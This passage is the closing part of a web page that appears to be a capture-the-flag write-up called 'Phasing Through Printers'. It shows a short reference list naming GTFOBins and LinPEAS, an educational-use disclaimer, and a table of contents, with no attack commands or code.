</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span>The analysis of the binary's source code (<code>admin_help.c</code>) provided a complete understanding of the intended (and flawed) functionality.</li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>GTFOBins</strong>: A curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. While not used for the final exploit, it's a critical resource for SUID binary analysis.</li>
<li data-line="2" dir="auto"><span class="list-bullet"></span><strong>LinPEAS</strong>: An automated script for comprehensive Linux privilege escalation enumeration.</li>
</ul></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto"><strong>Disclaimer</strong>: This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.</p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme-toggle-input" id=""><input class="theme-toggle-input" type="checkbox" id="theme-toggle-input"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="#ðŸ“¦_Phasing_Through_Printers_0" data-path="#ðŸ“¦_Phasing_Through_Printers_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="ðŸ“¦ Phasing Through Printers">ðŸ“¦ Phasing Through Printers</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Table_of_Contents_0" data-path="#Table_of_Contents_0"><div class="tree-item-inner heading-link" heading-name="Table of Contents">Table of Contents</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Introduction_0" data-path="#Introduction_0"><div class="tree-item-inner heading-link" heading-name="Introduction">Introduction</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Setup_0" data-path="#Setup_0"><div class="tree-item-inner heading-link" heading-name="Setup">Setup</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Reconnaissance_0" data-path="#Reconnaissance_0"><div class="tree-item-inner heading-link" heading-name="Reconnaissance">Reconnaissance</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Enumeration_0" data-path="#Enumeration_0"><div class="tree-item-inner heading-link" heading-name="Enumeration">Enumeration</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="#Vulnerability_Identification_0" data-path="#Vulnerability_Identification_0"><div class="tree-item-inner heading-link" heading-name="Vulnerability Identification">Vulnerability Identification</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="#Steps_to_Escalate_Privileges_0" data-path="#Steps_to_Escalate_Privileges_0"><div class="tree-item-inner heading-link" heading-name="Steps to Escalate Privileges:">Steps to Escalate Privileges:</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="#Post-Exploitation/Flag_0" data-path="#Post-Exploitation/Flag_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation/Flag">Post-Exploitation/Flag</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="#Capturing_the_Flag_0" data-path="#Capturing_the_Flag_0"><div class="tree-item-inner heading-link" heading-name="Capturing the Flag">Capturing the Flag</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Lessons_Learned_0" data-path="#Lessons_Learned_0"><div class="tree-item-inner heading-link" heading-name="Lessons Learned">Lessons Learned</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>